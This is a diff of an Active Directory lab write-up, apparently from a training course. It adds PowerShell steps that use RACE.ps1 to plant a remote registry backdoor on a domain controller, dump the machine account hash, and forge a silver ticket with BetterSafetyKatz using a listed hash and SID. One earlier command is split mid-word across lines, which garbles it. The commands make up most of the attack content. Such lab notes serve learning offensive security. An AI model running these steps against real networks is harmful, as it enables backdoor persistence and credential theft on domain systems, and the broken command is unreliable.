@@ -111,7 +111,9 @@ import the RACE.ps1 module
 ```
 And modify the service
 ```powershell
-Set-RemoteWMI -SamAccountName <STUPID USER> -ComputerName <NOME MACCHINA> -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -SamAccountName <STU
+
+PID USER> -ComputerName <NOME MACCHINA> -namespace 'root\cimv2' -Verbose
 ```
 ![[Pasted image 20231025144401.png]]
 Now we granted the acces to us
@@ -132,3 +134,28 @@ To check if the command worked
 Invoke-Command -ScriptBlock{whoami} -ComputerName <MACCHINA>
 ```
 ![[Pasted image 20231025145545.png]]
+
+
+### **Retrieve hash of Machine without admin access**
+To retrieve access without Domain admin access we need to modify a permission on the dc
+So open a session, import race.ps1 and launche te command.
+```powershell
+. C:\AD\Tools\RACE.ps1
+```
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student115 -Verbose
+```
+![[Pasted image 20231025150802.png]]
+and retrieve the hash
+```powershell
+. C:\AD\Tools\RACE.ps1
+```
+```powershell
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+![[Pasted image 20231025150902.png]]
+and with that we can create a silver ticket for the services (in this case HOST)
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
